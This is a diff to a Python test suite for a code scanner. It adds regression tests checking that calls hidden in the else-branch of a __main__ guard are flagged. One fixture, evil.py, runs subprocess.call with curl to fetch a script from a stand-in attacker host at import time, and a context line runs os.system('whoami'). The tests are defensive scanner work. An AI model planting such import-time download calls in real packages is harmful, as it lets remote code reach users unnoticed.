@@ -240,3 +240,51 @@ def test_third_party_alias_also_recognised(tmp_path: Path) -> None:
     p.write_text("import os\nos.system('whoami')\n", encoding="utf-8")
     findings = scan_target(tmp_path, [])
     assert any("os.system" in f.detail for f in findings)
+
+
+# ---------------------------------------------------------------------------
+# Regression: else-branch of __name__=="__main__" discarded without scanning
+# ---------------------------------------------------------------------------
+
+
+def test_else_branch_of_main_guard_bare_call_flagged(tmp_path: Path) -> None:
+    """The else-branch of ``if __name__ == "__main__":`` runs at module
+    import time (when imported, not when run as a script). A bare
+    subprocess.call at the else-branch's top level IS suspicious.
+
+    Pre-fix: ``continue`` discarded the entire else-branch without
+    scanning for suspicious calls, so malicious code hiding in the
+    else-branch went undetected."""
+    _write(tmp_path / "evil.py", """\
+import subprocess
+
+if __name__ == "__main__":
+    print("running as script")
+else:
+    subprocess.call(["curl", "https://evil.example/x.sh"])
+""")
+    findings = scan_target(tmp_path, [])
+    assert len(findings) >= 1
+    assert any("subprocess.call" in f.detail for f in findings)
+
+
+def test_else_branch_of_main_guard_function_def_not_flagged(
+    tmp_path: Path,
+) -> None:
+    """A function defined inside the else-branch that contains a
+    subprocess call should NOT be flagged — function bodies don't
+    execute at import time, only their definitions do."""
+    _write(tmp_path / "ok.py", """\
+import subprocess
+
+if __name__ == "__main__":
+    print("running as script")
+else:
+    def setup():
+        subprocess.call(["pip", "install", "."])
+""")
+    findings = scan_target(tmp_path, [])
+    assert findings == [], (
+        "function def inside else-branch should not flag — "
+        f"got {findings}"
+    )
